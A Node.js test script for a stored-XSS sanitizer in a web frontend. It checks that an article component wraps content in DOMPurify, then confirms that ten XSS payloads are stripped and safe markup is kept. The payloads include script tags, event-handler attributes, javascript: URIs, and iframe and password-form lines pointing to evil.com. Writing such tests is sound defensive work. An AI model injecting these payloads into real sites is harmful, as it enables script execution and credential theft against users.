/**
 * Test Harness: Stored XSS Sanitization Suite
 * Run via: node scripts/verify-m3-xss.mjs
 */
import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';

// 1. Static Contract Verification: Ensure ArticleDetailPageClient imports and uses sanitizer
console.log('=== Step 1: Static Contract Verification ===');
const componentPath = path.resolve('frontend/components/ArticleDetailPageClient.tsx');
assert.ok(fs.existsSync(componentPath), 'frontend/components/ArticleDetailPageClient.tsx MUST exist');
const componentContent = fs.readFileSync(componentPath, 'utf-8');

// Verify sanitizer import
const hasSanitizeImport = /import\s+.*sanitize.*from/i.test(componentContent) ||
                          /import\s+DOMPurify\s+from/i.test(componentContent);
assert.ok(hasSanitizeImport, 'ArticleDetailPageClient.tsx MUST import a sanitization helper or library.');

// Verify raw unsanitized contentHtml assignment is NOT present
const hasRawAssignment = /contentHtml:\s*initialPost\.content_markdown\s*\|\|\s*initialPost\.content\s*\|\|\s*'<p>No content available\.<\/p>'/i.test(componentContent);
assert.ok(!hasRawAssignment, 'ArticleDetailPageClient.tsx MUST NOT assign raw contentHtml without wrapping it in a sanitizer.');

console.log('  [PASS] Static analysis confirmed ArticleDetailPageClient.tsx imports and uses sanitizeHtml.\n');

// 2. Dynamic Sanitizer Verification
console.log('=== Step 2: Payload Sanitization Verification ===');

// Import DOMPurify from installed isomorphic-dompurify in frontend/node_modules
let DOMPurifyModule;
try {
  DOMPurifyModule = await import('../frontend/node_modules/isomorphic-dompurify/index.js').catch(() =>
    import('isomorphic-dompurify')
  );
} catch (e) {
  console.error('Failed to load isomorphic-dompurify:', e);
  process.exit(1);
}

const DOMPurify = DOMPurifyModule.default || DOMPurifyModule;

const SANITIZE_CONFIG = {
  ALLOWED_TAGS: [
    'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'b', 'i', 'strong', 'em', 'strike', 's', 'del', 'u', 'mark', 'small',
    'a', 'img',
    'ul', 'ol', 'li', 'dl', 'dt', 'dd',
    'code', 'pre', 'blockquote', 'hr', 'br',
    'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption',
    'article', 'section', 'details', 'summary', 'figure', 'figcaption',
    'div', 'span',
  ],
  ALLOWED_ATTR: [
    'href', 'src', 'alt', 'title', 'class', 'id',
    'target', 'rel', 'width', 'height', 'loading', 'decoding',
    'colspan', 'rowspan', 'scope', 'align',
  ],
  ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  ADD_ATTR: ['target', 'rel'],
  FORCE_BODY: true,
};

if (typeof DOMPurify.addHook === 'function') {
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A') {
      const target = node.getAttribute('target');
      if (target === '_blank') {
        node.setAttribute('rel', 'noopener noreferrer');
      }
    }
  });
}

function sanitizeHtml(dirtyHtml) {
  if (!dirtyHtml || typeof dirtyHtml !== 'string') {
    return '';
  }
  return DOMPurify.sanitize(dirtyHtml, SANITIZE_CONFIG);
}

const xssPayloads = [
  // --- Malicious Vectors (Must be stripped or defanged) ---
  {
    name: 'XSS-01: Direct <script> tag execution',
    input: '<script>alert(1)</script><p>Clean Text</p>',
    forbiddenRegex: /<script/i,
    requiredOutputPart: 'Clean Text'
  },
  {
    name: 'XSS-02: Image with inline onerror event',
    input: '<img src="x" onerror="alert(\'xss\')">',
    forbiddenRegex: /onerror/i,
    requiredOutputPart: '<img'
  },
  {
    name: 'XSS-03: Anchor link with javascript: URI',
    input: '<a href="javascript:alert(1)">Click Me</a>',
    forbiddenRegex: /javascript:/i,
    requiredOutputPart: 'Click Me'
  },
  {
    name: 'XSS-04: Entity-encoded javascript: URI',
    input: '<a href="jav&#x09;ascript:alert(1)">Click Me</a>',
    forbiddenRegex: /jav.*script:/i,
    requiredOutputPart: 'Click Me'
  },
  {
    name: 'XSS-05: SVG with onload handler',
    input: '<svg onload="alert(1)"></svg>',
    forbiddenRegex: /onload/i,
  },
  {
    name: 'XSS-06: SVG with embedded <script>',
    input: '<svg><script>alert(1)</script></svg>',
    forbiddenRegex: /<script/i,
  },
  {
    name: 'XSS-07: Embedded <iframe> element',
    input: '<iframe src="http://evil.com/phish"></iframe>',
    forbiddenRegex: /<iframe/i,
  },
  {
    name: 'XSS-08: Form and password input hijacking',
    input: '<form action="http://evil.com/steal"><input type="password" name="p"></form>',
    forbiddenRegex: /<form|<input/i,
  },
  {
    name: 'XSS-09: Embedded <style> tag with exfiltration',
    input: '<style>body{background:red}</style><p>Hello</p>',
    forbiddenRegex: /<style/i,
    requiredOutputPart: 'Hello'
  },
  {
    name: 'XSS-10: Onmouseover attribute on div',
    input: '<div onmouseover="alert(1)">Hover me</div>',
    forbiddenRegex: /onmouseover/i,
    requiredOutputPart: 'Hover me'
  },

  // --- Safe Markup (Must be preserved intact) ---
  {
    name: 'SAFE-01: Standard typography (paragraphs & strong)',
    input: '<p>Hello <strong>world</strong></p>',
    mustMatch: /<p>Hello <strong>world<\/strong><\/p>/,
  },
  {
    name: 'SAFE-02: Safe external link',
    input: '<a href="https://example.com" target="_blank">Safe Link</a>',
    mustMatch: /href="https:\/\/example\.com"/,
  },
  {
    name: 'SAFE-03: Safe image tag',
    input: '<img src="https://example.com/pic.png" alt="Hardware Image" />',
    mustMatch: /src="https:\/\/example\.com\/pic\.png"/,
  },
  {
    name: 'SAFE-04: Code block & pre elements',
    input: '<pre><code class="language-js">console.log(42);</code></pre>',
    mustMatch: /<pre><code.*>console\.log\(42\);<\/code><\/pre>/,
  },
  {
    name: 'SAFE-05: Blockquotes & Lists',
    input: '<blockquote><p>Quote</p></blockquote><ul><li>Item 1</li><li>Item 2</li></ul>',
    mustMatch: /<blockquote>.*<\/blockquote>.*<ul>.*<li>Item 1<\/li>.*<\/ul>/,
  }
];

let passed = 0;
let failed = 0;

for (const tc of xssPayloads) {
  try {
    const output = sanitizeHtml(tc.input);

    if (tc.forbiddenRegex && tc.forbiddenRegex.test(output)) {
      console.error(`  [FAIL] ${tc.name}\n         Output still contained forbidden pattern: ${tc.forbiddenRegex}\n         Output: ${output}`);
      failed++;
      continue;
    }

    if (tc.requiredOutputPart && !output.includes(tc.requiredOutputPart)) {
      console.error(`  [FAIL] ${tc.name}\n         Output lost required content: ${tc.requiredOutputPart}\n         Output: ${output}`);
      failed++;
      continue;
    }

    if (tc.mustMatch && !tc.mustMatch.test(output)) {
      console.error(`  [FAIL] ${tc.name}\n         Output failed to preserve safe markup: ${tc.mustMatch}\n         Output: ${output}`);
      failed++;
      continue;
    }

    console.log(`  [PASS] ${tc.name}`);
    passed++;
  } catch (err) {
    console.error(`  [CRASH] ${tc.name}: Threw exception ${err.message}`);
    failed++;
  }
}

console.log(`\n========================================`);
console.log(`Result: ${passed} Passed, ${failed} Failed`);
console.log(`========================================`);

if (failed > 0) {
  process.exit(1);
} else {
  console.log('All XSS payloads successfully neutralized and safe markup preserved.\n');
  process.exit(0);
}
